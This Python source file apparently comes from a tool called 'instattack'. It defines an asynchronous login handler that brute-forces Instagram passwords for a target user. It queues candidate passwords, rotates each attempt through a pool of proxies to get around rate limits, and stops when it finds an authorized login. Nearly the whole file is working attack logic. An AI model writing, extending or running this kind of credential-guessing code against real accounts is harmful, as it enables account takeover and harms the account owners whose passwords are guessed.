from __future__ import absolute_import

import asyncio
import aiohttp
import aiojobs
import collections

from instattack.src.base import HandlerMixin
from instattack.src.utils import percentage

from .models import InstagramResults
from .exceptions import NoPasswordsError
from .requests import RequestHandler
from .utils import limit_on_success, limit_as_completed


"""
In Regard to Cancelled Tasks on Web Server Disconnect:
---------
<https://github.com/aio-libs/aiohttp/issues/2098>

Now web-handler task is cancelled on client disconnection (normal socket closing
by peer or just connection dropping by unpluging a wire etc.)

This is pretty normal behavior but it confuses people who come from world of
synchronous WSGI web frameworks like flask or django.

>>> async def handler(request):
>>>     async with request.app['db'] as conn:
>>>          await conn.execute('UPDATE ...')

The above is problematic if there is a client disconnect.

To remedy:

(1)  For client disconnections/fighting against Task cancellation I would
     recommend asyncio.shield. That's why it exists
(2)  In case user wants a way to control tasks in a more granular way, then I
     would recommend aiojobs
(3)  Ofc if user wants to execute background tasks (inside the same loop) I
      would also recommend aiojobs
"""


class LoginHandler(RequestHandler, HandlerMixin):

    __name__ = 'Login Handler'
    __logconfig__ = "login_attempts"

    def __init__(self, config, proxy_handler, user=None, start_event=None, stop_event=None):
        super(LoginHandler, self).__init__(config, proxy_handler)

        self.user = user
        self.start_event = start_event
        self.stop_event = stop_event

        self.limit = config['login']['limit']
        self.batch_size = config['login']['batch_size']
        self.attempt_batch_size = config['login']['attempts']['batch_size']

        self.passwords = asyncio.Queue()

        self.num_completed = 0
        self.num_passwords = 0  # Index for the current password and attempts per password.
        self.attempts_count = collections.Counter()  # Indexed by Password
        self.proxies_count = collections.Counter()  # Indexed by Proxy Unique ID

    async def run(self, loop):
        log = self.create_logger('attack', ignore_config=True)
        await log.start('Running Login Handler')

        await self.prepopulate(loop)
        results = await self.attack(loop)
        await log.complete('Login Handler Done')
        return results

    async def attempt_single_login(self, loop, password):
        log = self.create_logger('attack', ignore_config=True)
        await log.start('Starting Single Login')

        await self.passwords.put(password)
        self.num_passwords = 1

        results = await self.attack(loop)
        return results.results[0]

    async def attack(self, loop):
        log = self.create_logger('attack', ignore_config=True)

        await log.start('Starting Attack')

        scheduler = await aiojobs.create_scheduler(limit=100, exception_handler=None)
        results = await self.attempt_login(loop, scheduler)
        return results

    async def prepopulate(self, loop):
        log = self.create_logger('prepopulate', ignore_config=True)

        message = f'Generating All Attempts for User {self.user.username}.'
        if self.limit:
            message = f'Generating {self.limit} Attempts for User {self.user.username}.'
        await log.start(message)

        passwords = await self.user.get_new_attempts(loop, limit=self.limit)
        if len(passwords) == 0:
            raise NoPasswordsError()

        self.num_passwords = len(passwords)
        for password in passwords:
            await self.passwords.put(password)

        await log.complete(f"Prepopulated {len(passwords)} Password Attempts")

    async def generate_login_tasks(self, loop, session, scheduler):
        """
        Generates coroutines for each password to be attempted and yields
        them in the generator.

        We don't have to worry about a stop event if the authenticated result
        is found since this will generate relatively quickly and the coroutines
        have not been run yet.
        """
        while not self.passwords.empty():
            password = await self.passwords.get()
            if password:
                yield self.attempt_with_password(loop, session, password, scheduler)

    async def attempt_login(self, loop, scheduler):
        """
        For each password in the queue, runs the login_with_password coroutine
        concurrently in order to validate each password.

        The login_with_password coroutine will make several concurrent requests
        using different proxies, so this is the top level of a tree of nested
        concurrent IO operations.
        """
        log = self.create_logger('attempt_login')

        results = InstagramResults(results=[])

        await log.debug('Waiting on Start Event...')
        await self.start_event.wait()
        cookies = await self.cookies()

        await log.debug('Starting Client Session')

        async with aiohttp.ClientSession(
            connector=self._connector,
            cookies=cookies,
            timeout=self._timeout,
        ) as session:

            gen = self.generate_login_tasks(loop, session, scheduler)

            async for result in limit_as_completed(gen, self.batch_size):
                # Generator Does Not Yield None on No More Coroutines
                if not result.conclusive:
                    raise RuntimeError("Result should be valid and conclusive.")

                self.num_completed += 1

                # TODO: Using the login_index here as the total number only works
                # because the login_tasks are generated so quickly, we need a more
                # sustainable way of doing this.
                await log.success(
                    f'Percent Done: {percentage(self.num_completed, self.num_passwords)}')

                if result.authorized:
                    asyncio.shield(scheduler.spawn(
                        self.user.create_or_update_attempt(result.password, success=True)))
                    results.add(result)
                    break

                else:
                    if not result.not_authorized:
                        raise RuntimeError('Result should not be authorized.')

                    results.add(result)
                    asyncio.shield(scheduler.spawn(
                        self.user.create_or_update_attempt(result.password, success=False)))

        await log.complete('Closing Session')
        await asyncio.sleep(0)

        asyncio.shield(scheduler.close())
        return results

    async def generate_login_attempts(self, loop, session, password, scheduler):
        """
        Generates coroutines for each password to be attempted and yields
        them in the generator.

        We don't have to worry about a stop event if the authenticated result
        is found since this will generate relatively quickly and the coroutines
        have not been run yet.
        """
        log = self.create_logger('generate_login_attempts')

        while True:
            proxy = await self.proxy_handler.pool.get()
            if not proxy:
                # TODO: Raise Exception Here Instead
                await log.error('No More Proxies in Pool')
                break

            if proxy.unique_id in self.proxies_count:
                await log.warning(
                    f'Already Used Proxy {self.proxies_count[proxy.unique_id]} Times.',
                    extra={'proxy': proxy}
                )

            # We are going to want to use these to display information
            # later...
            self.proxies_count[proxy.unique_id] += 1
            self.attempts_count[password] += 1
            yield self.login_request(loop, session, password, proxy, scheduler)

    async def attempt_with_password(self, loop, session, password, scheduler):
        """
        Makes concurrent fetches for a single password and limits the number of
        current fetches to the batch_size.  Will return when it finds the first
        request that returns a valid result.
        """
        log = self.create_logger('attempt_with_password')

        # TODO:  We should figure out a way to allow proxies to repopulate and wait
        # on them for large number of password requests.  We don't want to bail when
        # there are no more proxies because we might be using them all currently

        # Wait for start event to signal that we are ready to start making
        # requests with the proxies.
        await self.start_event.wait()

        await log.start(f'Atempting Login with {password}')

        result, num_tries = await limit_on_success(
            self.generate_login_attempts(loop, session, password, scheduler),
            self.attempt_batch_size
        )

        await log.complete(
            f'Done Attempting Login with {password} '
            f'After {num_tries} Attempt(s)',
            extra={
                'other': result
            })
        return result
